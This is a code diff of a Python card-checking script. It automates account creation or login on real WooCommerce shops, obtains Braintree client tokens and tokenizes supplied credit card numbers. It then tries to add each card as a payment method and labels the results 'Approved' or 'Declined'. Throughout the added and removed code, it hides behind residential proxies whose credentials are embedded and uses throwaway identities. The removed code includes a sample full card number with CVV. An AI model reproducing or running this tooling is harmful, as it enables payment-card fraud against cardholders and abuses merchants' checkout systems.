@@ -1,16 +1,14 @@
-import uuid
-import names
 import base64
 import random
-import base64
+import secrets
+import uuid
+import names
+import time
 from requests import Session
 from dataclasses import dataclass
-from dataclasses import dataclass
-
-
 
 @dataclass
-class BehaviorsBraintree:
+class ConfigsPAge:
 
     def ResponseHtml(self, response:str=None):   
         if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
@@ -23,8 +21,7 @@ class BehaviorsBraintree:
         elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
         elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
         elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
-        elif 'Duplicate card exists in the vault.' in response: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
-        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
+        elif 'Duplicate card exists in the vault.' in response: return 'Approved! ✅', '1000: Approved',
         else:                                                       return 'Declined! ❌', response
 
     def SaveResponseHhml(self, response:str):
@@ -94,173 +91,62 @@ class BehaviorsBraintree:
     @classmethod
     def DecodeBear(self, dato:str = None):
         self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
-        self.bear_end = BehaviorsBraintree().QueryText(
+        self.bear_end = ConfigsPAge().QueryText(
             self._tokenEncoding, 
             '"authorizationFingerprint":"',  
             '","')
 
         return self.bear_end
-
-
-class Braintree2:
-    def main(self,cards):
-        self.UseMail = BehaviorsBraintree().RandomName('email')
-        self.Nombre = BehaviorsBraintree().RandomName('username')
-
-        self.session = Session()
-        self.session.proxies.update({'http://': 'http://5lsbptwhow0s8kt:4zubvgfavptnx9y@rp.scrapegw.com:6060', 'https://': 'http://5lsbptwhow0s8kt:4zubvgfavptnx9y@rp.scrapegw.com:6060'})
-         
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        self.req_1 = self.session.get('https://stephanieriseley.com/my-account/', headers=headers)
-        self.nonce_registre = BehaviorsBraintree().QueryText(self.req_1.text,'name="woocommerce-register-nonce" value="','"')
-
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        data = {
-            'email': self.UseMail,
-            'wc_order_attribution_source_type': 'typein',
-            'wc_order_attribution_referrer': '(none)',
-            'wc_order_attribution_utm_campaign': '(none)',
-            'wc_order_attribution_utm_source': '(direct)',
-            'wc_order_attribution_utm_medium': '(none)',
-            'wc_order_attribution_utm_content': '(none)',
-            'wc_order_attribution_utm_id': '(none)',
-            'wc_order_attribution_utm_term': '(none)',
-            'wc_order_attribution_utm_source_platform': '(none)',
-            'wc_order_attribution_utm_creative_format': '(none)',
-            'wc_order_attribution_utm_marketing_tactic': '(none)',
-            'wc_order_attribution_session_entry': 'https://stephanieriseley.com/my-account/',
-            'wc_order_attribution_session_start_time': '2025-02-17 20:13:09',
-            'wc_order_attribution_session_pages': '2',
-            'wc_order_attribution_session_count': '1',
-            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'woocommerce-register-nonce': self.nonce_registre,
-            '_wp_http_referer': '/my-account/',
-            'register': 'Register',
-        }
-
-        self.session.post('https://stephanieriseley.com/my-account/', headers=headers, data=data)
-
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        self.req_2 = self.session.get('https://stephanieriseley.com/my-account/edit-address/billing/', headers=headers)
-        self.edit_address_bill = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-edit-address-nonce" value="','"')
-        
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/billing/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        data = {
-            'billing_first_name': self.Nombre,
-            'billing_last_name': self.Nombre,
-            'billing_company': '',
-            'billing_country': 'US',
-            'billing_address_1': 'Times Square, Nueva York, EE. UU.',
-            'billing_address_2': '',
-            'billing_city': 'Manhattan',
-            'billing_state': 'NY',
-            'billing_postcode': '10036',
-            'billing_phone': '56889738432',
-            'billing_email': self.UseMail,
-            'save_address': 'Save address',
-            'woocommerce-edit-address-nonce': self.edit_address_bill,
-            '_wp_http_referer': '/my-account/edit-address/billing/',
-            'action': 'edit_address',
-        }
-
-        self.session.post('https://stephanieriseley.com/my-account/edit-address/billing/', headers=headers, data=data,)
-        
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/billing/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        self.session.get('https://stephanieriseley.com/my-account/edit-address/', headers=headers)
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        self.session.get('https://stephanieriseley.com/my-account/payment-methods/', headers=headers)
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/payment-methods/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        self.req_3 = self.session.get('https://stephanieriseley.com/my-account/add-payment-method/', headers=headers)
-        self.payment_nonce = BehaviorsBraintree().QueryText(self.req_3.text,'name="woocommerce-add-payment-method-nonce" value="','"')
-        self.client_token_nonce_2 = BehaviorsBraintree().QueryText(self.req_3.text,'"client_token_nonce":"','"')
-
-        headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://stephanieriseley.com','priority': 'u=1, i','referer': 'https://stephanieriseley.com/my-account/add-payment-method/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
-        data = {
-            'action': 'wc_braintree_credit_card_get_client_token',
-            'nonce': self.client_token_nonce_2,
-        }
-
-        self.req_4 = self.session.post('https://stephanieriseley.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-        self.data_J = self.req_4.json()['data']
-        self.client_eyj = BehaviorsBraintree().DecodeBear(self.data_J)
-        self.session_client_id = BehaviorsBraintree().SessionId()
-        self.ccs = BehaviorsBraintree().Ccs(cards)
-        
-
-        headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'custom',
-                'sessionId': self.session_client_id,
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': self.ccs[0],
-                        'expirationMonth': self.ccs[1],
-                        'expirationYear': self.ccs[2],
-                        'cvv': self.ccs[3],
-                    },
-                    'options': {
-                        'validate': False,
-                    },
-                },
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
-
-        self.req_5 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-        self.token_card = BehaviorsBraintree().QueryText(self.req_5.text,'{"token":"','"')
-        
-
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/add-payment-method/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
-        data = [
-                ('payment_method', 'braintree_credit_card'),
-                ('wc-braintree-credit-card-card-type', 'visa'),
-                ('wc-braintree-credit-card-3d-secure-enabled', ''),
-                ('wc-braintree-credit-card-3d-secure-verified', ''),
-                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
-                ('wc_braintree_credit_card_payment_nonce', self.token_card),
-                ('wc_braintree_device_data', '{"correlation_id":"b4aec9773fa5516a72e547bc9acdbd5e"}'),
-                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
-                ('wc_braintree_paypal_payment_nonce', ''),
-                ('wc_braintree_device_data', '{"correlation_id":"b4aec9773fa5516a72e547bc9acdbd5e"}'),
-                ('wc-braintree-paypal-context', 'shortcode'),
-                ('wc_braintree_paypal_amount', '0.00'),
-                ('wc_braintree_paypal_currency', 'USD'),
-                ('wc_braintree_paypal_locale', 'en_us'),
-                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
-                ('woocommerce-add-payment-method-nonce', self.payment_nonce),
-                ('_wp_http_referer', '/my-account/add-payment-method/'),
-                ('woocommerce_add_payment_method', '1'),
-            ]
-
-        response = self.session.post('https://stephanieriseley.com/my-account/add-payment-method/', headers=headers, data=data,)
-        self.session.close()
-
-        if 'Nice! New payment method' in response.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
-        elif "81724: Duplicate card exists in the vault." in response.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
-        
-        error = BehaviorsBraintree().QueryText(response.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
-        
-        if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
-        else:
+    
+correlationid = secrets.token_hex(16)
+class myb3:
+    def main(self,card):
+        try: 
+            self.session = Session()
+            self.session.proxies.update({"http://": "http://bb7c7e53e570809d:RNW78Fm5@res.proxy-seller.com:10000","https://": "http://bb7c7e53e570809d:RNW78Fm5@res.proxy-seller.com:10000",})
             
+            user = ['yuhiro891@gmail.com','y.uhiro891@gmail.com','j.uanchkkm@gmail.com','juanxhfc@gmail.com','yu.hiro891@gmail.com','yuh.iro891@gmail.com','yuhi.ro891@gmail.com','hfcfamx@gmail.com','h.fcfamx@gmail.com',]
+            usernames = random.choice(user)
+
+            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
+            r1 = self.session.get('https://my.restrictcontentpro.com/my-account/', headers=headers)
+            self.nonce_login = ConfigsPAge().QueryText(r1.text,'name="woocommerce-login-nonce" value="','"')
+
+            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://my.restrictcontentpro.com','priority': 'u=0, i','referer': 'https://my.restrictcontentpro.com/my-account/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
+            data = {'username': usernames,'password': 'MrSalchichapenepequeño10c@','woocommerce-login-nonce': self.nonce_login,'_wp_http_referer': '/my-account/','login': 'Log in',}
+            response = self.session.post('https://my.restrictcontentpro.com/my-account/', headers=headers, data=data)
+
+            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://my.restrictcontentpro.com/my-account/payment-methods/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
+            r2 = self.session.get('https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers)
+            self.payment_nonce = ConfigsPAge().QueryText(r2.text,'name="woocommerce-add-payment-method-nonce" value="','"')
+            self.client_token_nonce = ConfigsPAge().QueryText(r2.text,'"client_token_nonce":"','"')
+
+            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://my.restrictcontentpro.com','priority': 'u=1, i','referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
+            data = {'action': 'wc_braintree_credit_card_get_client_token','nonce': self.client_token_nonce,}
+            r3 = self.session.post('https://my.restrictcontentpro.com/wp/wp-admin/admin-ajax.php', headers=headers, data=data,)
+            self.data_J = r3.json()['data']
+            self.client_eyj = ConfigsPAge().DecodeBear(self.data_J)
+            self.session_client_id = ConfigsPAge().SessionId()
+            self.ccs = ConfigsPAge().Ccs(card)
+
+            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
+            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.session_client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
+            r4 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+            self.token_card = ConfigsPAge().QueryText(r4.text,'"token":"','"')
+
+            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://my.restrictcontentpro.com','priority': 'u=0, i','referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
+            data = [('payment_method', 'braintree_credit_card'),('wc-braintree-credit-card-card-type', 'visa'),('wc-braintree-credit-card-3d-secure-enabled', ''),('wc-braintree-credit-card-3d-secure-verified', ''),('wc-braintree-credit-card-3d-secure-order-total', '0.00'),('wc_braintree_credit_card_payment_nonce', self.token_card),('wc_braintree_device_data', '{"correlation_id":"208c72bae3622a0ffbf6790b1ad6147b"}'),('wc-braintree-credit-card-tokenize-payment-method', 'true'),('wc_braintree_paypal_payment_nonce', ''),('wc_braintree_device_data', '{"correlation_id":"208c72bae3622a0ffbf6790b1ad6147b"}'),('wc-braintree-paypal-context', 'shortcode'),('wc_braintree_paypal_amount', '0.00'),('wc_braintree_paypal_currency', 'USD'),('wc_braintree_paypal_locale', 'en_us'),('wc-braintree-paypal-tokenize-payment-method', 'true'),('woocommerce-add-payment-method-nonce', self.payment_nonce),('_wp_http_referer', '/my-account/add-payment-method/'),('woocommerce_add_payment_method', '1'),]
+            avs = self.session.post('https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers, data=data,)
+            self.session.close()
+            time.sleep(15)
+
+            if 'Nice! New payment method' in avs.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
+            elif "81724: Duplicate card exists in the vault." in avs.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
+        
+            error = ConfigsPAge().QueryText(avs.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
             
-            return BehaviorsBraintree().ResponseHtml(error[1].split('Status code ')[1].strip())
-
-
-
-
-"""ccs ='4147342032463541|05|2026|872'
-chk = Braintree2().main(ccs)
-print(chk)
-print('--------------------------------')"""
+            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
+            else:
+                
+                return ConfigsPAge().ResponseHtml(error[1].split('Status code ')[1].strip())
+        except: return 'Declined! ❌','Declined - Call Issue'
